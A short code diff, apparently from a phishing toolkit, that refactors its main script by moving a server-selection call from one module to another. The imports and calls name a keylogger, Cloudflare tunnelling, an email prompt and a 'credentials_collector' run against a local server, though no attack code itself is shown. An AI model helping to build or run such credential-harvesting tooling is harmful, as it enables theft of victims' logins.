@@ -10,7 +10,6 @@ import Defs.FeatureManager.keylogger as keylogger
 import Defs.FeatureManager.cloudflare as cloudflare
 import Defs.FeatureManager.EmailManager.email_prompt as email_prompt
 import Defs.ActionManager.Server.server_runner as server_runner
-import Defs.ActionManager.Server.server_menu as server_menu
 import Defs.ActionManager.simple_informant as simple_informant
 import multiprocessing
 import sys
@@ -46,7 +45,7 @@ if __name__ == "__main__":
 
         ##############
         server_runner.start_server(port)
-        server_menu.server_selection(port)
+        server_runner.server_selection(port)
 
         multiprocessing.Process(target=server_runner.start_server, args=(port,)).start()
         simple_informant.credentials_collector(port)
